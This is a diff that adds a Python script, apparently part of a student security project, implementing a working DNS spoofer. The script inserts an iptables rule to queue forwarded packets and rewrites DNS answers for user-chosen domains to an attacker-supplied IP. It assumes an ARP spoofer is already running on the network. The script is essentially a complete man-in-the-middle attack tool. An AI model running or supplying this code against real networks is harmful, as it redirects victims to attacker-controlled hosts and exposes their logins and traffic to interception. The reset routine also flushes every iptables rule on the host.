@@ -1,0 +1,124 @@
+#Done by Fatima Hammoud
+#Reference [5] in report
+
+import subprocess  #Imports the subprocess module for executing shell commands
+import time  #Imports the time module to handle timing functions
+import ipaddress  #Imports the ipaddress module to validate and manipulate IP addresses
+from colorama import Fore, Style  #Imports Fore and Style for colored terminal output
+import scapy.all  #Imports all functions and classes from the Scapy library for packet manipulation
+import netfilterqueue  #Imports the netfilterqueue module to handle packets in userspace
+
+# List of DNS hosts to spoof
+dns_hosts = [
+    b"www.google.com.",  
+    b"google.com.",      
+    b"www.facebook.com.",  
+    b"facebook.com.",      
+    b"kali.org.",          
+    b"www.kali.org.",      
+    b"bing.com.",          
+    b"linkedin.com.",      
+    b"www.linkedin.com."   
+]
+
+ip = ""  #Variable to store the IP address to redirect to
+dns_hosts = []  #List to store user-defined DNS hosts for spoofing
+
+def main_dns():
+    #Main function to start the DNS spoofer
+    print(f"{Fore.BLUE}Welcome To DNS Spoofer{Style.RESET_ALL}")
+    try:
+        print(f"{Fore.YELLOW}[***] Please Start ARP Spoofer Before Using this Module [***] {Style.RESET_ALL}")
+        redirect_data()  #Get the redirect IP address from the user
+        add_host_in_list()  #Add DNS hosts to the spoofing list
+        print(f"{Fore.GREEN}[++] Intercepting requests .... [++]{Style.RESET_ALL}")
+        #Call the function to set up iptables for packet interception
+        define_queue_iptable()
+    except KeyboardInterrupt:
+        reset_setting()  #Reset settings if interrupted
+        time.sleep(3)  #Wait for 3 seconds before exiting
+
+def ipv4_check(string):
+    #Function to check if a string is a valid IPv4 address
+    try:
+        ipaddress.IPv4Network(string)  #Validate the string as an IPv4 network
+        return True  #Return True if valid
+    except:
+        return False  #Return False if invalid
+
+def redirect_data():
+    #Function to get the IP address to redirect DNS requests
+    while True:
+        ip_redirect = input("[+] Please Enter the IP address where you want to redirect the target [-]  :  ")
+        if ipv4_check(ip_redirect):  #Validate the IP address
+            global ip  #Declare `ip` as global to modify it
+            ip = ip_redirect  #Set the global IP variable
+            break  #Exit the loop if valid
+        else:
+            print(f"{Fore.RED}[*] Please enter a valid IP address [*]{Style.RESET_ALL}")
+
+def add_host_in_list():
+    #Function to add user-defined URLs for DNS spoofing
+    url = input("[+] Please Enter the URL to spoof (separate by spaces): ")
+    url = url.split()  #Split the input string into a list of URLs
+    for x in url:
+        temp = bytes(x + ".", 'utf-8')  #Convert each URL to bytes
+        dns_hosts.append(temp)  #Add the URL to the DNS hosts list
+    print(f"{Fore.GREEN}[*] Spoofing URLs ==> ")
+    print(f"{Fore.BLUE}{dns_hosts}{Style.RESET_ALL}")  #Display the spoofed URLs
+
+def define_queue_iptable():
+    #Function to set up iptables to redirect packets to the netfilter queue
+    queue_number = "99"  #Define the queue number
+    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queue_number])  #Set up iptables rule
+    
+    queue = netfilterqueue.NetfilterQueue()  #Create a NetfilterQueue object
+    try:
+        #Bind the queue number to the callback function `process_packet`
+        queue.bind(int(queue_number), process_packet)
+        queue.run()  #Start the queue to process packets
+    except KeyboardInterrupt:
+        reset_setting()  #Reset settings if interrupted
+
+def process_packet(packet):
+    #Function to process intercepted packets
+    try:
+        scapy_packet = scapy.all.IP(packet.get_payload())  #Convert packet payload to Scapy IP packet
+        if scapy_packet.haslayer(scapy.all.DNSRR):  #Check if the packet contains a DNS response
+            query = scapy_packet[scapy.all.DNSQR].qname  #Get the DNS query name
+            print("--------------------")
+            print("[+] Intercepted request for ====> ", query.decode())  #Print the intercepted request
+            print(scapy_packet.summary())  #Print a summary of the packet
+            if query in dns_hosts:  #Check if the query is in the spoofed hosts list
+                print(f"{Fore.GREEN}[*] Spoofing URL For ", query.decode())  #Print the URL being spoofed
+                print("[*] Before Modification")
+                print(scapy_packet.summary())  #Print the packet summary before modification
+                
+                #Create the DNS response with the specified redirect IP address
+                answer = scapy.all.DNSRR(rrname=query, rdata=ip)
+                scapy_packet[scapy.all.DNS].an = answer  #Add the answer to the packet
+                scapy_packet[scapy.all.DNS].ancount = 1  #Set the answer count to 1
+                
+                #Remove the original packet length and checksum fields to recalculate them
+                del scapy_packet[scapy.all.IP].len
+                del scapy_packet[scapy.all.IP].chksum
+                del scapy_packet[scapy.all.UDP].len
+                del scapy_packet[scapy.all.UDP].chksum
+                
+                packet.set_payload(bytes(scapy_packet))  #Set the modified packet as the new payload
+                
+                print("[*] After Modification")
+                print(f"{scapy_packet.summary()}{Style.RESET_ALL}")  #Print the packet summary after modification
+            print("--------------------")
+        packet.accept()  #Accept the packet for further processing
+    except KeyboardInterrupt:
+        return  #Exit the function if interrupted
+
+def reset_setting():
+    # Function to reset iptables settings
+    print(f"{Fore.YELLOW}\n[*] Resetting IP Tables [*]")  #Indicate the start of the reset process
+    subprocess.call(["iptables", "--flush"])  #Flush all iptables rules
+    print(f"\n[+] Exiting...{Style.RESET_ALL}")  #Indicate exiting the program
+
+if __name__ == "__main__":
+    main_dns()  #Call the main function to run the DNS spoofer     
